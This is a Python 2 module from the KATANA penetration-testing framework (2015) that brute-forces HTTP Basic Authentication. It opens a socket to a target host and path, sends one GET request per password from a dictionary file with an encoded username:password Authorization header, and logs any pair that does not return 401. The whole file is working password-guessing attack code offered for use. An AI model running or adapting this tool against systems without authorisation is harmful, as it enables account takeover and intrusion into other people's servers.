# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                     #
# Modules   : Brute Force 403 #
# Script by : RedToor         #
# Date      : 27/02/2015      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import help         #
from core import ping         #
import sys                    #
d=DESIGN()                    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import time                   #
import socket                 #
import base64                 #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost=LOCAL_IP
defaultport=HTTP_PORT
defaultpach="/upl/"
defaultuser=USERNAME
defaultdic2=DITIONARY_PASSWORDS
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

def run(target,port,patch,username,ditionary):
	global defaulthost,defaultport,defaultpach,defaultuser,defaultdic2
	defaulthost=target
	defaultport=port
	defaultpach=patch
	defaultuser=username
	defaultdic2=ditionary
	httpbt(1)

def httpbt(run):
	try:
		global defaulthost,defaultport,defaultpach,defaultuser,defaultdic2
		if run!=1:
			actions=raw_input(d.prompt("web/httpbt"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
			d.descrip("patch","yes","Folder or dir",defaultpach)
 			d.descrip("user","yes","Username",defaultuser)
 			d.descrip("dict_1","yes","Dictionary pass",defaultdic2)
 			print ""
		elif actions[0:10] == "set target":
			defaulthost=defaulthost.replace("http://", "")
			defaulthost=ping.update(defaulthost,actions,"target")
			d.change("target",defaulthost)
		elif actions[0:8] == "set port":
			defaultport=ping.update(defaultport,actions,"port")
			d.change("port",defaultport)
		elif actions[0:9] == "set patch":
			defaultpach=ping.update(defaultpach,actions,"patch")
			d.change("patch",defaultpach)
		elif actions[0:8] == "set user":
			defaultuser=ping.update(defaultuser,actions,"user")
			d.change("user",defaultuser)
		elif actions[0:10] == "set dict_1":
			defaultdic2=ping.update(defaultdic2,actions,"dict_1")
			d.change("dict_1",defaultdic2)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					red=socket.socket(socket.AF_INET, socket.SOCK_STREAM)      
					red.connect((defaulthost, int(defaultport))) 
					try:
						d.loading_file()
						try:
							with open(defaultdic2,'r') as passs:
								for ps in passs:
									ps=ps.replace("\n","")
									red.send("GET "+defaultpach+" HTTP/1.1\r\n")							
									red.send("HOST: "+defaulthost+"\r\n")							
									red.send("Authorization:Basic "+base64.b64encode(defaultuser+":"+ps)+"\r\n\r\n")  
									last=red.recv(1000)	
									if last.find("401")<=0:
										ping.savethree("BruteForceHTTP",defaulthost,defaultport,defaultpach,defaultuser,ps)
										d.Success(defaultuser,ps)
										red.close
										httpbt(0)
									else:
										print " "+Alr+" Checking (username="+defaultuser+")(password="+ps+")"
										red.close
						except:
							Errors.Errors(event=sys.exc_info()[0], info=defaultdic2)
					except:
						Errors.Errors(event=sys.exc_info()[0], info=False)
			except:
				Errors.Errors(event=sys.exc_info()[0], info=defaulthost+":"+defaultport)
		else:
			d.No_actions()
	except:
		Errors.Errors(event=sys.exc_info()[0], info=False)
	httpbt(0)